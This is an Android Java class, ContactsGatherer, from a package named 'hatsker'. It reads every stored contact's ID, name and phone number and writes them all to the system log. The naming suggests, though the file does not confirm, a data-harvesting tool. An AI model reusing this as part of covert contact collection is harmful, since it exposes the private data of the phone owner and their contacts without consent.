package com.example.student.hatsker;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;

import java.util.Date;

/**
 * Created by Игорь on 25.07.2017.
 */

public class ContactsGatherer implements Gatherer {

    ContactsGatherer(Context context)
    {
        getInfo(context);
    }

    @Override
    public String getInfo(Context context) {

        Cursor c = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[]{ContactsContract.CommonDataKinds.Phone._ID,
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER}, null, null, null);
        StringBuilder stringBuilder = new StringBuilder();
        int totalContacts;

        try {
            totalContacts = c.getCount();
        }
        catch (NullPointerException e) {
            Log.i("asd",stringBuilder.toString());
            return "No contacts found";
        }

        if (totalContacts >0) {

            stringBuilder.append("Total contacts:" + Integer.toString(totalContacts));

            if (c.moveToFirst()) {

                c.moveToFirst();
                for (int j = 0; j < totalContacts; j++) {


                    stringBuilder.append("\nID:" + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone._ID)) +
                            "\nName:" + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) +
                            "\nNumber:" + c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)) +
                            "\n-------------------------------");

                    c.moveToNext();
                }
            }

            c.close();

            Log.i("asd",stringBuilder.toString());
            return stringBuilder.toString();
        }
        else
        {
            Log.i("asd",stringBuilder.toString());
            return "No contacts found";
        }
    }
}
